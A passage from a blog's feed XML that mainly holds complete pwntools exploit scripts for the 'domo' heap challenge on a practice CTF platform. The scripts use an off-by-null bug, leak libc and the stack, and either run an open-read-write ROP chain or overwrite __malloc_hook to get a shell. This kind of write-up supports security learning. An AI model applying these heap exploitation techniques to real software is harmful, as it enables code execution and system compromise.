class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>, <span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak heap----------------</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"\x10"</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line">heap_addr=u64 (p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">free (<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------leak libc----------------</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">"A"</span>* <span class="number">0x100</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'b'</span>* <span class="number">0x100</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'c'</span> *<span class="number">0x68</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'d'</span> *<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'e'</span>*<span class="number">56</span>+p64(<span class="number">0x71</span>)+<span class="string">'e'</span>*<span class="number">176</span>+ p64(<span class="number">0x100</span>) +p64(<span class="number">0x21</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,p64 (<span class="number">0x21</span>) *<span class="number">2</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x11"</span>*<span class="number">0x60</span>+p64(<span class="number">0x300</span>)) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'flag'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)+<span class="string">'\x22'</span>*<span class="number">0x58</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libc.address=main_arena<span class="number">-0x3c4b78</span></span><br><span class="line">environ_addr=libc.symbols[<span class="string">"environ"</span>]</span><br><span class="line">stdout_hook=libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">stdin_hook=libc.symbols[<span class="string">"_IO_2_1_stdin_"</span>]</span><br><span class="line">_IO_file_jumps=libc.symbols[<span class="string">"_IO_file_jumps"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak stack_addr--------------</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload+=p64(stdout_hook<span class="number">-0x43</span>)</span><br><span class="line">add(<span class="number">0x118</span>,payload) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">5</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+p64(_IO_file_jumps)+p64(<span class="number">0xfbad1800</span>)+p64(stdout_hook+<span class="number">131</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(environ_addr)+p64(environ_addr+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"len="</span>,hex(len(payload))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,payload) <span class="comment">#6</span></span><br><span class="line">stack_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xf2</span></span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------Write orw to stack----------</span></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0xf8</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)) <span class="comment">#4</span></span><br><span class="line">free2(<span class="number">0</span>)</span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)) <span class="comment">#7</span></span><br><span class="line">free2(<span class="number">7</span>)</span><br><span class="line">add2(<span class="number">0x108</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)+p64(stdin_hook<span class="number">-0x28</span>))</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'flag'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc.search(asm(<span class="string">"pop rdi\nret"</span>)).next()</span><br><span class="line">pop_rsi_ret=libc.search(asm(<span class="string">"pop rsi\nret"</span>)).next()</span><br><span class="line">pop_rdx_ret=libc.search(asm(<span class="string">"pop rdx\nret"</span>)).next()</span><br><span class="line"></span><br><span class="line">open_addr=libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">read_addr=libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">puts_addr=libc.symbols[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">orw=p64(pop_rdi_ret)+p64(heap_addr+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">72</span>)+p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x100</span>)+p64(puts_addr)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">"_IO_file_jumps"</span>])+p64(<span class="number">0</span>)+ p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(stack_addr)+p64(stack_addr+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">edit(stdin_hook<span class="number">-0x20</span>,<span class="string">'\x7f'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,payload)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"5\n"</span>+orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3><p>还有另一种非预期思路，打<code>malloc_hook</code>,然后利用<code>scanf</code>函数输入过多字符，会调用<code>malloc</code>申请内存</p><p>这里<code>onegadget</code>都失效了，用<code>realloc</code>调整偏移即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + malloc_hook-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">malloc_hook_payload2=<span class="string">'b'</span>*<span class="number">0xb</span>+p64(one[<span class="number">2</span>]+libc.address)+p64(sym(<span class="string">"realloc"</span>)+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,malloc_hook_payload2) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg(0x12D7)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">'0'</span>*<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;domo&quot;&gt;&lt;a href=&quot;#domo&quot; class=&quot;headerlink&quot; title=&quot;domo&quot;&gt;&lt;/a&gt;domo&lt;/h2&gt;&lt;p&gt;一道 domo日了一天，最后还是做出来，还是很高兴的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;off-by-null&lt;/code&gt;漏洞，e
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>gcc编译器和clang编译器的对比分析</title>
    <link href="https://nocbtm.github.io/2020/05/11/gcc%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cclang%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/05/11/gcc编译器和clang编译器的对比分析/</id>
    <published>2020-05-11T13:36:10.000Z</published>
    <updated>2020-09-01T10:49:40.807Z</updated>
    
    <content type="html"><![CDATA[<p>咕咕咕，留个坑。等有时间再写</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;咕咕咕，留个坑。等有时间再写&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>一种新的动态链接方式</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/05/08/一种新的动态链接方式/</id>
    <published>2020-05-08T04:20:22.000Z</published>
    <updated>2020-05-11T14:02:11.521Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19NLsaeNpcI8EoMMR+EvmLbai8dZWXq5r8= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>对hello world的重新认识</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E5%AF%B9hello-world%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/"/>
    <id>https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/</id>
    <published>2020-05-08T02:07:19.000Z</published>
    <updated>2020-05-25T03:32:08.776Z</updated>
    
